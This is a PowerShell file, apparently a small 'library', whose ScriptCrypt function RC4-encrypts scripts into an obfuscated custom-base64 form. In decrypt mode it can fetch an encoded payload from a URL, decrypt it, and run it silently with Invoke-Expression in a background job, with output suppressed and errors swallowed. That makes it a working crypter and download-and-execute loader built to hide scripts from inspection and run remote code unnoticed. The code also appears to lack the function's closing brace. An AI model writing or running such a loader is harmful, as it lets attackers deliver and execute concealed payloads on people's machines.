# TFBSE library v1.0

function ScriptCrypt {
    param(
        [Parameter(Mandatory=$true,Position=0)][ValidateSet('E','D')][string]$Mode,
        [Parameter(Mandatory=$true,Position=1)][string]$Path,
        [Parameter(Mandatory=$true,Position=2)][string]$Key
    )
    $A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'

    function _enc([byte[]]$b) {
        $s = New-Object Text.StringBuilder
        for ($i=0; $i -lt $b.Length; $i+=3) {
            $x = [int]$b[$i] -shl 16
            if ($i+1 -lt $b.Length) { $x = $x -bor ([int]$b[$i+1] -shl 8) }
            if ($i+2 -lt $b.Length) { $x = $x -bor [int]$b[$i+2] }
            [void]$s.Append($A[($x -shr 18) -band 63])
            [void]$s.Append($A[($x -shr 12) -band 63])
            if ($i+1 -lt $b.Length) { [void]$s.Append($A[($x -shr 6) -band 63]) }
            if ($i+2 -lt $b.Length) { [void]$s.Append($A[$x -band 63]) }
        }
        $s.ToString()
    }
    function _dec([string]$t) {
        $l = New-Object Collections.Generic.List[byte]
        $buf = 0; $bits = 0
        foreach ($c in $t.ToCharArray()) {
            $v = $A.IndexOf($c)
            if ($v -lt 0) { continue }
            $buf = ($buf -shl 6) -bor $v
            $bits += 6
            while ($bits -ge 8) {
                $bits -= 8
                [void]$l.Add([byte](($buf -shr $bits) -band 255))
            }
            if ($bits -gt 0) { $buf = $buf -band ((1 -shl $bits) - 1) } else { $buf = 0 }
        }
        ,$l.ToArray()
    }
    function _rc4([byte[]]$k,[byte[]]$d) {
        $S = New-Object int[] 256
        for ($i=0; $i -lt 256; $i++) { $S[$i] = $i }
        $j = 0
        for ($i=0; $i -lt 256; $i++) {
            $j = ($j + $S[$i] + $k[$i % $k.Length]) % 256
            $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
        }
        $o = New-Object byte[] $d.Length
        $i = 0; $j = 0
        for ($n=0; $n -lt $d.Length; $n++) {
            $i = ($i + 1) % 256
            $j = ($j + $S[$i]) % 256
            $t = $S[$i]; $S[$i] = $S[$j]; $S[$j] = $t
            $o[$n] = [byte]($d[$n] -bxor $S[($S[$i] + $S[$j]) % 256])
        }
        ,$o
    }
    function _rk([string]$key,[byte[]]$nonce) {
        $kb = [Text.Encoding]::UTF8.GetBytes($key)
        $r = New-Object byte[] ($kb.Length + 8)
        [Array]::Copy($kb,0,$r,0,$kb.Length)
        [Array]::Copy($nonce,0,$r,$kb.Length,8)
        ,$r
    }
   if ($Mode -eq 'E') {
    $full = [IO.Path]::GetFullPath($Path)
    if (-not [IO.File]::Exists($full)) { throw "File not found: $full" }
    $plain = [IO.File]::ReadAllBytes($full)
    $nonce = New-Object byte[] 8
    ([Security.Cryptography.RandomNumberGenerator]::Create()).GetBytes($nonce)
    $k = _rk $Key $nonce
    $ct = _rc4 $k $plain
    $all = New-Object byte[] ($ct.Length + 8)
    [Array]::Copy($nonce,0,$all,0,8)
    [Array]::Copy($ct,0,$all,8,$ct.Length)
    $out = [IO.Path]::Combine(
        [IO.Path]::GetDirectoryName($full),
        ([IO.Path]::GetFileNameWithoutExtension($full) + '.crypt.ps1'))
    [IO.File]::WriteAllText($out, (_enc $all), [Text.Encoding]::ASCII)
    return $out
}
elseif ($Mode -eq 'D') {
    if ($Path -match '^https?://') {
        $text = (New-Object Net.WebClient).DownloadString($Path)
    } else {
        if (-not [IO.File]::Exists($Path)) { throw "File not found: $Path" }
        $text = [IO.File]::ReadAllText($Path)
    }
    $data = _dec $text.Trim()
    if ($data.Length -lt 8) { throw 'Bad data' }
    $nonce = New-Object byte[] 8
    [Array]::Copy($data,0,$nonce,0,8)
    $ct = New-Object byte[] ($data.Length - 8)
    [Array]::Copy($data,8,$ct,0,$ct.Length)
    $k = _rk $Key $nonce
    $script = [Text.Encoding]::UTF8.GetString((_rc4 $k $ct))
    Start-Job -ScriptBlock {
        param($c)
        $ProgressPreference='SilentlyContinue'
        $VerbosePreference='SilentlyContinue'
        $WarningPreference='SilentlyContinue'
        try { Invoke-Expression $c | Out-Null } catch { }
    } -ArgumentList $script | Out-Null
}
